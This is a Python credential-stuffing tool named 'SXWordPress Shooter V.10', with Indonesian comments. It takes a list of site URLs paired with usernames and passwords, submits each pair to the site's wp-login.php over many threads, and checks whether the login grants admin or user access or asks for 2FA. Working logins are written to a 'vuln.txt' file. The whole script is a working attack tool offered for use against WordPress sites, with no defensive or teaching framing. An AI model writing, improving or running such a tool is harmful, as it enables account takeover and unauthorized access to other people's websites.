import requests
import os
import threading
import argparse
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

ascii_art = f"""{GREEN}
██████████████████████████████████████████████████
█─▄▄▄▄█▄─▀─▄█▄─█▀▀▀█─▄█▄─▄▄─███▄─█─▄█▀░██████─▄▄─█
█▄▄▄▄─██▀─▀███─█─█─█─███─▄▄▄████▄▀▄███░██░░██─██─█
▀▄▄▄▄▄▀▄▄█▄▄▀▀▄▄▄▀▄▄▄▀▀▄▄▄▀▀▀▀▀▀▀▄▀▀▀▄▄▄▀▄▄▀▀▄▄▄▄▀
{YELLOW}SXWordPress Shooter V.10 - sxtools{RESET}
"""

output_lock = threading.Lock()


class ShooterArgumentParser(argparse.ArgumentParser):
    def error(self, message):
        print(f"{RED}[!] {message}{RESET}\n")
        self.print_help()
        self.exit(2)


def parse_payload_line(line):
    line = line.strip()
    if not line:
        return None, None, None
    match = re.match(r"^(https?://[^:]+):([^:]+):(.+)$", line)
    if not match:
        return None, None, None
    url = match.group(1).strip()
    user = match.group(2).strip()
    password = match.group(3).strip()
    if not url or not user or not password:
        return None, None, None
    return url, user, password


def attempt_login(target_url, username, password):
    base_url = target_url.rstrip("/")
    login_url = f"{base_url}/wp-login.php"
    session = requests.Session()
    data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": f"{base_url}/wp-admin/",
        "testcookie": "1",
    }
    try:
        response = session.post(login_url, data=data, allow_redirects=True, timeout=15)
    except Exception:
        # jika request sama sekali gagal (timeout, DNS, dll) anggap saja not_vuln
        # "blocked" hanya dipakai untuk status HTTP tertentu (401/402/403/500)
        return False, "not_vuln", None, False

    cookies = session.cookies.get_dict()
    login_final_url = response.url or ""
    has_logged_cookie = "wordpress_logged_in" in "".join(cookies.keys())

    # deteksi indikasi 2FA pada halaman login
    login_body = (response.text or "").lower()
    twofa_phrases = [
        "two-factor authentication",
        "2fa verification code",
        "two factor authentication",
        "authentication code:",
        "use a backup code",
    ]
    is_2fa = any(p in login_body for p in twofa_phrases)

    # jika tidak ada cookie login, cek status code untuk menentukan blocked / not_vuln
    if not has_logged_cookie:
        if response.status_code in (401, 402, 403, 500):
            return False, "blocked", login_final_url, is_2fa
        return False, "not_vuln", login_final_url, is_2fa

    # sudah login, cek akses langsung ke /wp-admin/
    admin_url = f"{base_url}/wp-admin/"
    try:
        admin_resp = session.get(admin_url, allow_redirects=True, timeout=15)
        admin_final_url = (admin_resp.url or "").lower()
        admin_body = (admin_resp.text or "").lower()
        is_admin_url = "/wp-admin" in admin_final_url
        forbidden_phrases = [
            "sorry, you are not allowed to access this page.",
            "you do not currently have privileges on this site",
            "you do not have sufficient permissions",
            "the current user doesn't have the",
        ]
        forbidden = any(p in admin_body for p in forbidden_phrases)

        # 2FA juga bisa muncul saat akses /wp-admin/
        admin_twofa = any(p in admin_body for p in twofa_phrases)
        is_2fa = is_2fa or admin_twofa

        is_admin = is_admin_url and not forbidden
    except Exception:
        admin_final_url = None
        is_admin = True

    status = "admin" if is_admin else "user"
    return True, status, login_final_url, is_2fa


def process_target(line):
    url, user, password = parse_payload_line(line)
    if not url or not user or not password:
        return None
    success, status, final_url, is_2fa = attempt_login(url, user, password)
    return url, user, password, success, status, final_url, is_2fa


def main():
    parser = ShooterArgumentParser(
        description="SXWordPress Shooter V.10 - sxtools",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument(
        "-i",
        "--input",
        required=True,
        help="path ke file payload (format: https://domain.com:user:pass per baris)",
    )
    parser.add_argument(
        "-t",
        "--threads",
        type=int,
        default=10,
        help="jumlah thread worker (default: 10)",
    )
    args = parser.parse_args()
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    print(ascii_art)
    payload_file = args.input
    if not os.path.isfile(payload_file):
        print(f"{RED}[!] File tidak ditemukan: {payload_file}{RESET}")
        return
    max_threads = args.threads if args.threads and args.threads > 0 else 10
    with open(payload_file, "r", encoding="utf-8", errors="ignore") as f:
        lines = [line for line in f if line.strip()]
    if not lines:
        print(f"{RED}[!] Tidak ada payload di dalam file.{RESET}")
        return
    output_dir = os.path.join(os.getcwd(), "output")
    os.makedirs(output_dir, exist_ok=True)
    output_path = os.path.join(output_dir, "vuln.txt")
    total_targets = len(lines)
    print(f"{BLUE}[🔫] Menjalankan WordPress Shoot dengan {total_targets} target menggunakan {max_threads} threads...{RESET}")

    vuln_entries = []
    block_height = 0
    processed_count = 0
    vuln_count = 0
    not_vuln_count = 0
    blocked_count = 0
    admin_count = 0
    user_count = 0

    def render_block(current_url):
        nonlocal block_height
        if block_height > 0:
            # gunakan escape sequence yang lebih umum: cursor up (A) + clear to end (J)
            print(f"\033[{block_height}A", end="")
            print("\033[J", end="")
        print(f"{BLUE}[ SCANNING ] {processed_count}/{total_targets} target selesai | Terakhir: {current_url}{RESET}", flush=True)
        print(f"{YELLOW}Vuln: {vuln_count} | Not Vuln: {not_vuln_count} | Blocked: {blocked_count} | Admin: {admin_count} | User: {user_count}{RESET}", flush=True)
        for ts, url_v, user_v, pass_v, role, is_2fa in vuln_entries:
            label = "ADMIN" if role == "admin" else "USER"
            color = RED if role == "admin" else YELLOW
            extra = " [2FA Required]" if is_2fa else ""
            print(f"{color}[{ts}] [{label}] {url_v} | {user_v}:{pass_v}{extra}{RESET}")
        block_height = 2 + len(vuln_entries)

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(process_target, line) for line in lines]
        for future in as_completed(futures):
            result = future.result()
            processed_count += 1
            if not result:
                render_block("-")
                continue
            url, user, password, success, status, final_url, is_2fa = result
            if status == "blocked":
                blocked_count += 1
            elif success:
                vuln_count += 1
                # status: "admin" atau "user"
                if status == "admin":
                    role = "admin"
                    admin_count += 1
                else:
                    role = "user"
                    user_count += 1
                ts = datetime.now().strftime("%H:%M:%S")
                vuln_entries.append((ts, url, user, password, role, is_2fa))
                with output_lock:
                    with open(output_path, "a", encoding="utf-8") as f:
                        f.write(f"{url}:{user}:{password}\n")
            else:
                not_vuln_count += 1
            render_block(url)

    print()
    print(f"{GREEN}[✓] Selesai. Hasil vuln tersimpan di: {output_path}{RESET}")


if __name__ == "__main__":
    main()
